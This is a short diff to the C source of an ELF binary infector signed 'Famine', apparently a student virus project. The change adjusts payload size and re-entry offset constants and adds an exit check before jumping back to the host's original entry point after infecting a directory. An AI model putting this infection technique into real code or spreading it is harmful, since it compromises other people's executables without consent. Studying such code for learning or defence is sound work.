@@ -8,8 +8,8 @@
 #include <sys/mman.h>
 #include <sys/syscall.h>
 
-#define BUILDER_SIZE 0x13c;
-#define BUILDER_RE_ENTRY_OFFSET 0xe2;
+#define BUILDER_SIZE 0x13f;
+#define BUILDER_RE_ENTRY_OFFSET 0xe5;
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
 __attribute__((section(".text"))) volatile static uint8_t infected = 0;
 // Structs
@@ -137,6 +137,9 @@ _start() {
     if (infect_dir(dir0, &file_self)) ft_exit(1);
 
     Elf64_Ehdr *header = file_self.mem;
+
+    if (old_entry == 0) ft_exit(0);
+
     uint64_t jump_to = header->e_entry + BUILDER_RE_ENTRY_OFFSET;
     __asm__ volatile("jmp *%0" : : "r"(jump_to));
 }
